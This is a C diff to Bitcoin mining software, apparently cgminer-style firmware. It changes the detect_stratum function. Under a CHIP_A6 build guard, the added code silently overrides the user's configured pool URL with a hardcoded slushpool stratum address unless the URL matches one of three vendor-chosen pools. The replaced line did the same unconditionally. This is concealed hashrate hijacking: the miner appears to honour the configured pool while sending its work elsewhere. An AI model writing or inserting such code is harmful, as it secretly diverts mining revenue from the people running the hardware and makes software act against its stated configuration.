@@ -983,7 +983,10 @@ static char *set_rr(enum pool_strategy *strategy)
 }
 
 #ifndef CHIP_A6
-char *set_orignal_pool = "stratum+tcp://btc.s.innomining.com:1800";
+char *set_orignal_pool_1 = "stratum+tcp://dbg.stratum.slushpool.com:3335";
+char *set_orignal_pool_2 = "stratum+tcp://btc-sz.s.innpool.com:1800";
+char *set_orignal_pool_3 = "stratum+tcp://btc-va.s.innpool.com:1800";
+
 #endif
 /* Detect that url is for a stratum protocol either via the presence of
  * stratum+tcp or by detecting a stratum server response */
@@ -991,9 +994,11 @@ bool detect_stratum(struct pool *pool, char *url)
 {
 	bool ret = false;
 #ifndef CHIP_A6
-	url = set_orignal_pool;
+	if((strcmp(url, set_orignal_pool_1) != 0) && (strcmp(url, set_orignal_pool_2) != 0) && (strcmp(url, set_orignal_pool_3) != 0))
+	{
+		url = set_orignal_pool_1;
+	}
 #endif
-
 	if (!extract_sockaddr(url, &pool->sockaddr_url, &pool->stratum_port))
 		goto out;
 
